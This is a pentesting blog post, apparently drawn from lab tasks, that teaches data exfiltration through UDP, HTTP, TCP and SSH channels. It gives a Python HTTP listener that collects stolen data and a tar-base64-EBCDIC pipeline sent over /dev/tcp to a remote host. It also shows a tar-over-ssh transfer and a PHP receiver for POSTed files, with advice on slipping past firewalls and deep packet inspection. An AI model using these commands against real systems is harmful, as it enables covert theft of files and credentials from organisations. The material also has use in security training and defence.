---
layout: post
title: "The Exfiltration Handbook"
date: 2026-01-24
categories: [pentesting]
image: https://miro.medium.com/v2/resize:fit:720/format:webp/1*nOvrIc-KReNi6cpEpPTOEQ.png
permalink: /blog/Data-Exfiltration
locked: false
---

In this guide, I’m breaking down how to "live off the land." We’re talking about taking standard commands and turning them into tunnels. Whether it’s a quick TCP pipe or a slow-burn DNS play, it’s all about being creative with what’s available.

### 1. The UDP Socket

This is almost identical to the method in your text, but it uses **UDP** instead of TCP. This is useful if the firewall blocks TCP connections but leaves UDP open (often for DNS or media traffic).

<div onclick="togglePerspective(event,this)" style="cursor: pointer; border: 2px solid #ccc; border-radius: 10px; overflow: hidden; margin: 20px 0;">
  
  <img src="https://miro.medium.com/v2/resize:fit:2000/format:webp/1*a7G9SaEkrJfqFv4Y2N_FIQ.png" 
       data-label="Attacker (Listener)" 
       data-color="#50fa7b" 
       data-align="left"
       style="width: 100%; display: block;">

  <img src="https://miro.medium.com/v2/resize:fit:2000/format:webp/1*J1uM1b5rD7dDmNAq_jamHg.png" 
       data-label="Victim (Sender)" 
       data-color="#ff5555" 
       data-align="right"
       style="width: 100%; display: none;">

  <img src="https://miro.medium.com/v2/resize:fit:2000/format:webp/1*k6y-TCqAW3ACofhnB74Fiw.png" 
       data-label="Attacker" 
       data-color="#50fa7b" 
       data-align="left"
       style="width: 100%; display: none;">

  <div class="perspective-label" style="padding: 10px; background: #282a36; font-weight: bold; color: #ff5555; text-align: left; transition: all 0.3s;">
    Attacker (Listener) <span style="font-size: 0.8em; opacity: 0.7;">(↻ Click to switch)</span>
  </div>

</div>

<script>
function togglePerspective(e, container) {
  e.stopPropagation();
  var images = container.querySelectorAll('img');
  var label = container.querySelector('.perspective-label');
  var current = -1;

  for (var i = 0; i < images.length; i++) {
    if (images[i].style.display !== 'none') {
      current = i;
      images[i].style.display = 'none';
      break;
    }
  }

  var next = (current + 1) % images.length;
  images[next].style.display = 'block';

  label.innerHTML = images[next].getAttribute('data-label') + ' <span style="font-size: 0.8em; opacity: 0.7;">(↻ Click to switch)</span>';
  label.style.color = images[next].getAttribute('data-color');
  label.style.textAlign = images[next].getAttribute('data-align');
}
</script>

### HTTP Exfiltration

sending data as a web request is one of the stealthiest methods. You can use curl or wget, which are installed on most Linux servers.

<div class="code-block-container">
  <span class="code-lang-tag">Python</span>
  <button class="copy-btn" onclick="copyCode(this)" title="Copy code">
    <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
      <rect x="9" y="9" width="13" height="13" rx="2" ry="2" stroke="currentColor" fill="none"/>
      <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" />
    </svg>
  </button>
  {% raw %}
  <pre><code class="python">
python3 -c '
from http.server import HTTPServer, BaseHTTPRequestHandler
class P(BaseHTTPRequestHandler):
    def do_POST(self):
        length = int(self.headers["Content-Length"])
        data = self.rfile.read(length).decode()
        with open("exfil.txt", "a") as f:
            f.write(data + "\n")
        print(f"[*] Data saved to exfil.txt")
        self.send_response(200)
        self.end_headers()
HTTPServer(("0.0.0.0", 80), P).serve_forever()
'
</code></pre>
  {% endraw %}
</div>

<div onclick="togglePerspective(event,this)" style="cursor: pointer; border: 2px solid #ccc; border-radius: 10px; overflow: hidden; margin: 20px 0;">
  
  <img src="https://miro.medium.com/v2/resize:fit:2000/format:webp/1*9ufNbLj6UEi7dmE6F5owaQ.png" 
       data-label="Attacker (Listener)" 
       data-color="#50fa7b" 
       data-align="left"
       style="width: 100%; display: block;">

  <img src="https://miro.medium.com/v2/resize:fit:2000/format:webp/1*4BAW1QhjX07m7w7AFxuTkw.png" 
       data-label="Victim (Sender)" 
       data-color="#ff5555" 
       data-align="right"
       style="width: 100%; display: none;">

  <img src="https://miro.medium.com/v2/resize:fit:2000/format:webp/1*bIx8lsHh_Z4JXZY8qBSRiA.png" 
       data-label="Attacker" 
       data-color="#50fa7b" 
       data-align="left"
       style="width: 100%; display: none;">

  <div class="perspective-label" style="padding: 10px; background: #282a36; font-weight: bold; color: #ff5555; text-align: left; transition: all 0.3s;">
    Attacker (Listener) <span style="font-size: 0.8em; opacity: 0.7;">(↻ Click to switch)</span>
  </div>

</div>

<script>
function togglePerspective(e, container) {
  e.stopPropagation();
  var images = container.querySelectorAll('img');
  var label = container.querySelector('.perspective-label');
  var current = -1;

  for (var i = 0; i < images.length; i++) {
    if (images[i].style.display !== 'none') {
      current = i;
      images[i].style.display = 'none';
      break;
    }
  }

  var next = (current + 1) % images.length;
  images[next].style.display = 'block';

  label.innerHTML = images[next].getAttribute('data-label') + ' <span style="font-size: 0.8em; opacity: 0.7;">(↻ Click to switch)</span>';
  label.style.color = images[next].getAttribute('data-color');
  label.style.textAlign = images[next].getAttribute('data-align');
}
</script>

### TCP socket

Communication over TCP requires two machines, one victim and one attacker machine, to transfer data. 


What is happening here is a pipeline:

`Directory → Compressed archive → Text encoding → Obfuscated encoding → Network transfer`

<div class="code-block-container">
  <span class="code-lang-tag">Terminal</span>
  <button class="copy-btn" onclick="copyCode(this)" title="Copy code">
    <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
      <rect x="9" y="9" width="13" height="13" rx="2" ry="2"/>
      <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/>
    </svg>
  </button>

  {% raw %}
  <div id="interactive-tcp" class="interactive-command">
    <div style="font-size:0.95em; margin-bottom:8px; color:#888;">
      Click any part to see a short explanation
    </div>

    <pre style="background:#0b0c10;color:#f8f8f2;padding:12px;border-radius:6px;overflow:auto;white-space:nowrap;">
      <code>
        <span class="cmd-token" data-key="tar">tar zcf - task4/</span>
        <span class="cmd-sep"> | </span>
        <span class="cmd-token" data-key="base64">base64</span>
        <span class="cmd-sep"> | </span>
        <span class="cmd-token" data-key="dd">dd conv=ebcdic</span>
        <span class="cmd-sep"> &gt; </span>
        <span class="cmd-token" data-key="devtcp">/dev/tcp/{IP}/{PORT}</span>
      </code>
    </pre>

    <div class="cmd-explain-box"
         style="margin-top:8px;padding:10px;border-radius:6px;background:#f6f6f6;color:#111;font-size:0.95em;min-height:34px;">
      Click a segment for a concise explanation.
    </div>
  </div>

  <style>
    .interactive-command pre { white-space: nowrap; overflow-x: auto; }
    .cmd-token {
      cursor: pointer;
      color: #8be9fd;
      padding: 2px 4px;
      border-radius: 4px;
      display: inline-block;
    }
    .cmd-token:hover { background: rgba(139,233,253,0.08); }
    .cmd-sep { color: #bfbfbf; padding: 0 6px; }
  </style>

  <script>
    (function(){
      const explanations = {
        tar: 'Create a gzip-compressed tar archive and send it to stdout.',
        base64: 'Encode the binary stream into Base64 so it can safely pass through text-only channels.',
        dd: 'Convert the character encoding to EBCDIC (often used for obfuscation).',
        devtcp: 'Send the data stream directly to a remote host via a TCP socket.'
      };

      // Use explicit ID to scope this block reliably
      const container = document.getElementById('interactive-tcp');
      if (container) {
        container.addEventListener('click', function(e){
          const token = e.target.closest('.cmd-token');
          if (!token) return;

          const box = container.querySelector('.cmd-explain-box');
          const key = token.dataset.key;

          box.textContent = explanations[key] || 'No explanation available.';
        });
      }
    })();
  </script>
  {% endraw %}
</div>


This command looks complex, but it is really just a chain of simple tools working together. At a high level, it takes a directory, packages it up, slightly disguises the data, and sends it directly to another machine over the network.

Nothing is written to disk. Everything happens as a live data stream.

Each command receives data, transforms it, and passes it along to the next step.

<div onclick="togglePerspective(event,this)" style="cursor: pointer; border: 2px solid #ccc; border-radius: 10px; overflow: hidden; margin: 20px 0;">
  
  <img src="https://miro.medium.com/v2/resize:fit:2000/format:webp/1*K1WYiX_clGaRKxAQB12sQQ.png" 
       data-label="Attacker (Listener)" 
       data-color="#50fa7b" 
       data-align="left"
       style="width: 100%; display: block;">

  <img src="https://miro.medium.com/v2/resize:fit:2000/format:webp/1*HeHxMpPbIJ1GWATmhfawSA.png" 
       data-label="Victim (Sender)" 
       data-color="#ff5555" 
       data-align="right"
       style="width: 100%; display: none;">

  <img src="https://miro.medium.com/v2/resize:fit:2000/format:webp/1*su5SrpJxzln85m280PlEUA.png" 
       data-label="Attacker" 
       data-color="#50fa7b" 
       data-align="left"
       style="width: 100%; display: none;">

  <div class="perspective-label" style="padding: 10px; background: #282a36; font-weight: bold; color: #ff5555; text-align: left; transition: all 0.3s;">
    Attacker (Listener) <span style="font-size: 0.8em; opacity: 0.7;">(↻ Click to switch)</span>
  </div>

</div>

<script>
function togglePerspective(e, container) {
  e.stopPropagation();
  var images = container.querySelectorAll('img');
  var label = container.querySelector('.perspective-label');
  var current = -1;

  for (var i = 0; i < images.length; i++) {
    if (images[i].style.display !== 'none') {
      current = i;
      images[i].style.display = 'none';
      break;
    }
  }

  var next = (current + 1) % images.length;
  images[next].style.display = 'block';

  label.innerHTML = images[next].getAttribute('data-label') + ' <span style="font-size: 0.8em; opacity: 0.7;">(↻ Click to switch)</span>';
  label.style.color = images[next].getAttribute('data-color');
  label.style.textAlign = images[next].getAttribute('data-align');
}
</script>

### Exfiltration using SSH

Most organizations allow outbound SSH (Port 22) for administrative purposes. Using a standard, trusted port makes your traffic look like routine maintenance rather than a data breach.

Because the tunnel is encrypted, Deep Packet Inspection (DPI) cannot easily see that you are sending `passwords.db` or `company_finances.zip.`

You don't always need to install new software; the tools already on the system are often enough for example:

| Tool  | Primary Use Case |
|-------|-----------------|
| SCP (Secure Copy) | The most straightforward way to copy files over SSH. Best for one-off transfers. |
| SFTP  | Useful for interactive sessions where you need to browse the remote file system before pulling data. |
| Rsync | Highly efficient for large datasets; it supports compression and only sends the differences between files. |

<div class="code-block-container">
  <span class="code-lang-tag">Terminal</span>

  <div id="interactive-ssh" class="interactive-command">
    <div style="font-size:0.95em; margin-bottom:8px; color:#888;">
      Click any part to see a short explanation
    </div>

    <pre style="background:#0b0c10;color:#f8f8f2;padding:12px;border-radius:6px;overflow:auto;white-space:nowrap;">
      <code>
        <span class="cmd-token" data-key="tar1">tar cf - task5/</span>
        <span class="cmd-sep"> | </span>
        <span class="cmd-token" data-key="ssh">ssh ... "..."</span>
        <span class="cmd-sep"> | </span>
        <span class="cmd-token" data-key="tar2">tar xpf -</span>
      </code>
    </pre>

    <div class="cmd-explain-box"
         style="margin-top:8px;padding:10px;border-radius:6px;background:#f6f6f6;color:#111;font-size:0.95em;min-height:34px;">
      Click a segment for a concise explanation.
    </div>
  </div>

  <style>
    .interactive-command pre { white-space: nowrap; overflow-x: auto; }
    .cmd-token { cursor: pointer; color: #8be9fd; padding: 2px 4px; border-radius: 4px; display: inline-block; }
    .cmd-token:hover { background: rgba(139,233,253,0.08); }
    .cmd-sep { color: #bfbfbf; padding: 0 6px; }
  </style>

  <script>
    (function(){
      const explanations = {
        tar1: 'The "-" tells tar to send the archive to STDOUT instead of a file.',
        ssh: 'This carries that STDOUT stream securely across the network to the remote host.',
        tar2: 'On the receiving end, "-" tells tar to read from STDIN and extract immediately.'
      };

      // Use explicit ID to scope this block reliably
      const container = document.getElementById('interactive-ssh');
      if (container) {
        const tokens = container.querySelectorAll('.cmd-token');
        tokens.forEach(token => {
          token.addEventListener('click', function(e){
            e.stopPropagation();
            const box = container.querySelector('.cmd-explain-box');
            const key = token.dataset.key;
            box.textContent = explanations[key] || 'No explanation available.';
          });
        });
      }
    })();
  </script>
</div>


<div onclick="togglePerspective(event,this)" style="cursor: pointer; border: 2px solid #ccc; border-radius: 10px; overflow: hidden; margin: 20px 0;">
  
  <img src="https://miro.medium.com/v2/resize:fit:2000/format:webp/1*pcT4c33k3tlrP36L6agadg.png" 
       data-label="Victim (Sender)" 
       data-color="#ff5555" 
       data-align="left"
       style="width: 100%; display: block;">

  <img src="https://miro.medium.com/v2/resize:fit:2000/format:webp/1*Inyk7UvYkJt30c_RytchdQ.png" 
       data-label="attacker" 
       data-color="#50fa7b" 
       data-align="right"
       style="width: 100%; display: none;">

  <div class="perspective-label" style="padding: 10px; background: #282a36; font-weight: bold; color: #ff5555; text-align: left; transition: all 0.3s;">
    Attacker (Listener) <span style="font-size: 0.8em; opacity: 0.7;">(↻ Click to switch)</span>
  </div>

</div>

<script>
function togglePerspective(e, container) {
  e.stopPropagation();
  var images = container.querySelectorAll('img');
  var label = container.querySelector('.perspective-label');
  var current = -1;

  for (var i = 0; i < images.length; i++) {
    if (images[i].style.display !== 'none') {
      current = i;
      images[i].style.display = 'none';
      break;
    }
  }

  var next = (current + 1) % images.length;
  images[next].style.display = 'block';

  label.innerHTML = images[next].getAttribute('data-label') + ' <span style="font-size: 0.8em; opacity: 0.7;">(↻ Click to switch)</span>';
  label.style.color = images[next].getAttribute('data-color');
  label.style.textAlign = images[next].getAttribute('data-align');
}
</script>

### HTTP Exfiltration #2

In many environments, outbound web traffic (HTTP/S) is the most likely protocol to be allowed through a firewall. By using a simple PHP "listener" on your server, you can turn a standard web request into a data mule.

<img 
  src="https://miro.medium.com/v2/resize:fit:2000/format:webp/1*y---MTXbxTAubMVhsA-YjQ.png"
  alt="Website initial view"
  class="zoomable-img"
  style="border: 2px solid #ccc; border-radius: 10px; cursor: zoom-in;"
/>

we prepared a webserver with a data handler

<div class="code-block-container" markdown="0">
  <span class="code-lang-tag">Terminal</span>
  <button class="copy-btn" onclick="copyCode(this)" title="Copy code">
    <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
      <rect x="9" y="9" width="13" height="13" rx="2" ry="2"/>
      <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" />
    </svg>
  </button>

  {% raw %}
  <pre><code class="language-php">
&lt;?php
if (isset($_POST['file'])) {
    $file = fopen("/tmp/http.bs64","w");
    fwrite($file, $_POST['file']);
    fclose($file);
}
?&gt;
  </code></pre>
  {% endraw %}
</div>

<div onclick="togglePerspective(event,this)" style="cursor: pointer; border: 2px solid #ccc; border-radius: 10px; overflow: hidden; margin: 20px 0;">
  
  <img src="https://miro.medium.com/v2/resize:fit:20000/format:webp/1*OntxvXeZbyxjXuqgGtBQfw.png" 
       data-label="Victim (Sender)" 
       data-color="#ff5555" 
       data-align="left"
       style="width: 100%; display: block;">

  <img src="https://miro.medium.com/v2/resize:fit:2000/format:webp/1*a8-UMeRzW62Ev8X_V7agkA.png" 
       data-label="attacker" 
       data-color="#50fa7b" 
       data-align="right"
       style="width: 100%; display: none;">

  <div class="perspective-label" style="padding: 10px; background: #282a36; font-weight: bold; color: #ff5555; text-align: left; transition: all 0.3s;">
    Attacker (Listener) <span style="font-size: 0.8em; opacity: 0.7;">(↻ Click to switch)</span>
  </div>

</div>

<script>
function togglePerspective(e, container) {
  e.stopPropagation();
  var images = container.querySelectorAll('img');
  var label = container.querySelector('.perspective-label');
  var current = -1;

  for (var i = 0; i < images.length; i++) {
    if (images[i].style.display !== 'none') {
      current = i;
      images[i].style.display = 'none';
      break;
    }
  }

  var next = (current + 1) % images.length;
  images[next].style.display = 'block';

  label.innerHTML = images[next].getAttribute('data-label') + ' <span style="font-size: 0.8em; opacity: 0.7;">(↻ Click to switch)</span>';
  label.style.color = images[next].getAttribute('data-color');
  label.style.textAlign = images[next].getAttribute('data-align');
}
</script>

> `NOTE`: If you don’t want data to be transmitted in cleartext, you can set up HTTPS using SSL keys stored on a server.
